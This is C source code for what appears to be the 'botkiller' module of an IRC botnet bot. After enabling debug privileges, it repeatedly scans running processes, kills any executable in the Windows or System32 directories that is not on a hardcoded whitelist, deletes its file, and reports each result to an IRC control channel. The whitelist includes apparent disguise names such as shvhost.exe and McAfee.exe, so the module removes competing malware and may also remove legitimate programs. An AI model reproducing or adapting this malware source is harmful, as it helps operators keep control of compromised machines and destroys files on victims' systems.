#include "../h/includes.h"
extern char InfoChan[];
extern char logo[];
char *exclude_sysdir[] = { "accwiz.exe", "actmovie.exe", "ahui.exe", "alg.exe", "append.exe", "arp.exe", 
"asr_fmt.exe", "asr_ldm.exe", "asr_pfu.exe", "at.exe", "ati2evxx.exe", "Ati2mdxx.exe", "atmadm.exe", "attrib.exe", 
"auditusr.exe", "autochk.exe", "autoconv.exe", "autofmt.exe", "autolfn.exe", "blastcln.exe", "bootcfg.exe", 
"bootok.exe", "bootvrfy.exe", "cacls.exe", "calc.exe", "charmap.exe", "ChCfg.exe", "chkdsk.exe", "chkntfs.exe", 
"cidaemon.exe", "cipher.exe", "cisvc.exe", "ckcnv.exe", "cleanmgr.exe", "cliconfg.exe", "clipbrd.exe", 
"clipsrv.exe", "clspack.exe", "cmd.exe", "cmdl32.exe", "cmmon32.exe", "cmstp.exe", "comp.exe", "compact.exe", 
"conime.exe", "control.exe", "convert.exe", "cscript.exe", "csrss.exe", "ctfmon.exe", "dcomcnfg.exe", "ddeshare.exe", 
"debug.exe", "defrag.exe", "dfrgfat.exe", "dfrgntfs.exe", "diantz.exe", "diskpart.exe", "diskperf.exe", 
"dllhost.exe", "dllhst3g.exe", "dmadmin.exe", "dmremote.exe", "doskey.exe", "dosx.exe", "dplaysvr.exe", "dpnsvr.exe", 
"dpvsetup.exe", "driverquery.exe", "drwatson.exe", "drwtsn32.exe", "dumprep.exe", "dvdplay.exe", 
"dvdupgrd.exe", "dwwin.exe", "dxdiag.exe", "edlin.exe", "esentutl.exe", "eudcedit.exe", "eventcreate.exe", 
"eventtriggers.exe", "eventvwr.exe", "exe2bin.exe", "expand.exe", "extrac32.exe", "fastopen.exe", "fc.exe", "find.exe", 
"findstr.exe", "finger.exe", "fixmapi.exe", "fltMc.exe", "fontview.exe", "forcedos.exe", "freecell.exe", "fsquirt.exe", 
"fsutil.exe", "ftp.exe", "gb2312.uce", "gdi.exe", "getmac.exe", "gpresult.exe", "gpupdate.exe", "grpconv.exe", 
"help.exe", "hostname.exe", "ie4uinit.exe", "iexpress.exe", "imapi.exe", "ipconfig.exe", 
"ipsec6.exe", "ipv6.exe", "ipxroute.exe", "java.exe", "javaw.exe", "javaws.exe", "jdbgmgr.exe", "jview.exe", 
"krnl386.exe", "label.exe", "lights.exe", "lnkstub.exe", "locator.exe", "lodctr.exe", "logagent.exe", "logman.exe", 
"logoff.exe", "logonui.exe", "lpq.exe", "lpr.exe", "lsass.exe", "magnify.exe", "makecab.exe", "mem.exe", "migpwd.exe", 
"mmc.exe", "mnmsrvc.exe", "mobsync.exe", "mountvol.exe", "mplay32.exe", "mpnotify.exe", "mqbkup.exe", "mqsvc.exe", 
"mqtgsvc.exe", "mrinfo.exe", "MRT.exe", "mscdexnt.exe", "msdtc.exe", "msg.exe", "mshearts.exe", 
"mshta.exe", "msiexec.exe", "mspaint.exe", "msswchx.exe", "mstinit.exe", "mstsc.exe", "narrator.exe", "nbtstat.exe", 
"nddeapir.exe", "NeroCheck.exe", "net.exe", "net1.exe", "netdde.exe", "netsetup.exe", "netsh.exe", "netstat.exe", 
"nlsfunc.exe", "notepad.exe", "nslookup.exe", "ntbackup.exe", "ntkrnlpa.exe", "ntoskrnl.exe", "ntsd.exe", 
"ntvdm.exe", "nw16.exe", "nwscript.exe", "odbcad32.exe", "odbcconf.exe", "openfiles.exe", "osk.exe", 
"osuninst.exe", "packager.exe", "pathping.exe", "pentnt.exe", "perfmon.exe", "ping.exe", "ping6.exe", "powercfg.exe", 
"print.exe", "progman.exe", "proquota.exe", "proxycfg.exe", "qappsrv.exe", "qprocess.exe", "qwinsta.exe", 
"rasautou.exe", "rasdial.exe", "rasphone.exe", "rcimlby.exe", "rcp.exe", "rdpclip.exe", "rdsaddin.exe", "rdshost.exe", 
"recover.exe", "redir.exe", "reg.exe", "REGCLADM.EXE", "regedt32.exe", "regini.exe", "regsvr32.exe", "regwiz.exe", 
"relog.exe", "replace.exe", "reset.exe", "rexec.exe", "route.exe", "routemon.exe", "rsh.exe", "rsm.exe", 
"rsmsink.exe", "rsmui.exe", "rsnotify.exe", "rsopprov.exe", "rsvp.exe", "rtcshare.exe", "RTLCPL.EXE", "runas.exe", 
"rundll32.exe", "runonce.exe", "rwinsta.exe", "savedump.exe", "sc.exe", "scardsvr.exe", "schtasks.exe", "sdbinst.exe", 
"secedit.exe", "services.exe", "sessmgr.exe", "sethc.exe", "setup.exe", "setver.exe", "sfc.exe", "shadow.exe", 
"share.exe", "shmgrate.exe", "shrpubw.exe", "shutdown.exe", "sigverif.exe", "skeys.exe", "smbinst.exe", 
"smlogsvc.exe", "smss.exe", "sndrec32.exe", "sndvol32.exe", "sol.exe", "sort.exe", "spider.exe", "spiisupd.exe", 
"spnpinst.exe", "spoolsv.exe", "sprestrt.exe", "spupdsvc.exe", "stimon.exe", "subrange.uce", "subst.exe", "svchost.exe", 
"syncapp.exe", "sysedit.exe", "syskey.exe", "sysocmgr.exe", "systeminfo.exe", "systray.exe", "taskkill.exe", 
"tasklist.exe", "taskman.exe", "taskmgr.exe", "tcmsetup.exe", "tcpsvcs.exe", "telnet.exe", "tftp.exe", "tlntadmn.exe", 
"tlntsess.exe", "tlntsvr.exe", "tourstart.exe", "tracerpt.exe", "tracert.exe", "tracert6.exe", "tscon.exe", 
"tscupgrd.exe", "tsdiscon.exe", "tskill.exe", "tsshutdn.exe", "typeperf.exe", "unlodctr.exe", "upnpcont.exe", 
"ups.exe", "user.exe", "userinit.exe", "usrmlnka.exe", "usrprbda.exe", "usrshuta.exe", "utilman.exe", "verclsid.exe", 
"verifier.exe", "viral.exe", "vssadmin.exe", "vssvc.exe", "vwipxspx.exe", "w32tm.exe", "wextract.exe", 
"wiaacmgr.exe", "winchat.exe", "WINDBVER.EXE", "winhlp32.exe", "winlogon.exe", "winmine.exe", 
"winmsd.exe", "winspool.exe", "winver.exe", "wjview.exe", "wowdeb.exe", "wowexec.exe", "wpabaln.exe", "wpnpinst.exe", 
"write.exe", "wscntfy.exe", "wscript.exe", "wuauclt.exe", "wuauclt1.exe", "wupdmgr.exe", "xcopy.exe", 
"ACDSee.scr", "logon.scr", "scrnsave.scr", "SeismoSaver.scr", "ss3dfo.scr", "ssbezier.scr", "ssflwbox.scr", 
"ssmarque.scr", "ssmypics.scr", "ssmyst.scr", "MDM.exe", "sspipes.scr", "ssstars.scr", "sstext3d.scr", "McAfee.exe", "w32services.exe", "wss.exe", "w32service.exe", "winups.exe", "loser.exe", "shvhost.exe", "System" };

char *exclude_windir[] = { "alcrmv.exe", "alcupd.exe", "explorer.exe", "hh.exe", "IsUninst.exe", 
"iun6002.exe", "NOTEPAD.EXE", "regedit.exe", "REGTLIB.EXE", "setdebug.exe", "Setup1.exe", "SOUNDMAN.EXE", 
"ST6UNST.EXE", "TASKMAN.EXE", "twunk_16.exe", "twunk_32.exe", "MDM.exe", "winhelp.exe", "winhlp32.exe", "w32services.exe", "wss.exe", "McAfee.exe", "w32service.exe", "winups.exe", "loser.exe", "shvhost.exe", "System" };

BOOL AdjustPrivileges(char *pPriv, BOOL add) {
	BOOL bRet = FALSE;
	TOKEN_PRIVILEGES tkp;
 	HANDLE hToken;

	if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken))
		return bRet;

	if (!LookupPrivilegeValue(NULL, pPriv, &tkp.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return bRet;
	}

	tkp.PrivilegeCount = 1;
	if (add)
		tkp.Privileges[0].Attributes |= SE_PRIVILEGE_ENABLED;
	else
		tkp.Privileges[0].Attributes ^= (SE_PRIVILEGE_ENABLED &
			tkp.Privileges[0].Attributes);

	bRet=AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES) NULL, 0);

	CloseHandle(hToken);

	return bRet;
}

BOOL FindFileBot(char *filename, char *dirname)
{
	char tmpPath[MAX_PATH];

	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		return TRUE;
	FindClose(fh);

	return FALSE;
}

//scanning thread
DWORD WINAPI BotKillerThread(LPVOID param) {
	char sysdir[MAX_PATH], windir[MAX_PATH], FileToDelete[MAX_PATH];
	char Buffer[MAX_LINE_SIZE];

	HANDLE hProcess, hProcess2;
	PROCESSENTRY32 pe32 = {0};
	MODULEENTRY32 me32 = {0};

	BK bk = *((BK *)param);
	BK *bkp = (BK *)param;
	IRC* irc=(IRC*)bk.conn;
	bkp->GotInfo = TRUE;

	Sleep(10000);
	
	//Get System Dir
	GetSystemDirectory(sysdir, sizeof(sysdir));

	//Get Windows Dir
	GetWindowsDirectory(windir, sizeof(windir));

	if (strstr(windir, "ystem32") != NULL) {

		char *Word;

		Word = strtok(windir, "\\");

		_snprintf(windir, sizeof(windir), "%s\\", Word);

		Word = strtok(NULL, "\\");

		_snprintf(windir, sizeof(windir), "%s\\%s", windir, Word);
	}

	if (bk.ScanDelay == 0)
		bk.ScanDelay = 60;
	while (1) {
//		if (CreateToolhelp32Snapshot && Process32First && Process32Next) {
			AdjustPrivileges(SE_DEBUG_NAME, TRUE);
			if ((hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0)) != INVALID_HANDLE_VALUE) {
				pe32.dwSize = sizeof(PROCESSENTRY32);
				if (Process32First(hProcess, &pe32)) {
					while (Process32Next(hProcess, &pe32)) {
						Sleep(200);
						if (lstrcmpi(pe32.szExeFile, exename) != 0) {
							//sysdir						
							if (FindFileBot(pe32.szExeFile, sysdir)) { //process exe is located in sydir
								int SysMatch = 0;
								for (int c=0; c < (sizeof(exclude_sysdir) / sizeof(LPTSTR)); c++)      //check if process is
									if (lstrcmpi(pe32.szExeFile, exclude_sysdir[c]) == 0) SysMatch++;  //on exclude list
								if (SysMatch == 0) {  //if there are no matches, start thread to terminate and delete the bot
									if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID)) {
										if (!TerminateProcess(hProcess2,0)) {
											irc->pmsg(InfoChan, "%s could not terminate %s! (%s)", logo, pe32.szExeFile, pe32.th32ProcessID);

											memset(Buffer, 0, sizeof(Buffer));
											CloseHandle(hProcess2);
										} else {
											CloseHandle(hProcess2);
											sprintf(FileToDelete, "%s\\%s", sysdir, pe32.szExeFile);
											BOOL success_delete = FALSE;
											//set file attribute to non-readonly = normal, so we can delete it
											SetFileAttributes(FileToDelete, FILE_ATTRIBUTE_NORMAL);
											for (int i = 0; i < 100; i++) { //try to delete file
												Sleep(i);
												if (DeleteFile(FileToDelete)) {
													success_delete = TRUE;
													break;
												}
											}
											if (success_delete) 
												_snprintf(Buffer, sizeof(Buffer), "%s bot removed: %s (%d)!", 
													logo, FileToDelete, pe32.th32ProcessID);
											else 
												_snprintf(Buffer, sizeof(Buffer), "%s tried to remove %s but failed :(", 
													logo, FileToDelete);
											
											irc->pmsg(InfoChan, Buffer, logo, pe32.szExeFile, pe32.th32ProcessID);

											memset(Buffer, 0, sizeof(Buffer));
										}
									}
								}
							}
							//windir						
							if (FindFileBot(pe32.szExeFile, windir)) { //process exe is located in windir
								int WinMatch = 0;
								for (int c=0; c < (sizeof(exclude_windir) / sizeof(LPTSTR)); c++)      //check if process is
									if (lstrcmpi(pe32.szExeFile, exclude_windir[c]) == 0) WinMatch++;  //on exclude list
								if (WinMatch == 0) {  //if there are no matches, start thread to terminate and delete the bot
									if (hProcess2=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID)) {
										if (!TerminateProcess(hProcess2,0)) {
											irc->pmsg(InfoChan, "%s could not terminate %s! (%s)", logo, pe32.szExeFile, pe32.th32ProcessID);

											memset(Buffer, 0, sizeof(Buffer));
											CloseHandle(hProcess2);
										} else {
											CloseHandle(hProcess2);
											sprintf(FileToDelete, "%s\\%s", windir, pe32.szExeFile);
											BOOL success_delete = FALSE;
											//set file attribute to non-readonly = normal, so we can delete it
											SetFileAttributes(FileToDelete, FILE_ATTRIBUTE_NORMAL);
											for (int i = 0; i < 100; i++) { //try to delete file
												Sleep(i);
												if (DeleteFile(FileToDelete)) {
													success_delete = TRUE;
													break;
												}
											}
											if (success_delete) 
												_snprintf(Buffer, sizeof(Buffer), "%s bot removed: %s (%d)!", 
													logo, FileToDelete, pe32.th32ProcessID);
											else 
												_snprintf(Buffer, sizeof(Buffer), "%s could not remove %s (pid: %d)!", 
													logo, FileToDelete, pe32.th32ProcessID);
										
											irc->pmsg(InfoChan, Buffer, logo, pe32.szExeFile, pe32.th32ProcessID);
											memset(Buffer, 0, sizeof(Buffer));
										}
									}
								}
							}
						}				
					}
				}
				CloseHandle(hProcess);
			}
			AdjustPrivileges(SE_DEBUG_NAME, FALSE);
//		}
		Sleep(bk.ScanDelay*60000);
	}

	ClearThread(bk.ThreadNum);
	ExitThread(0);
}
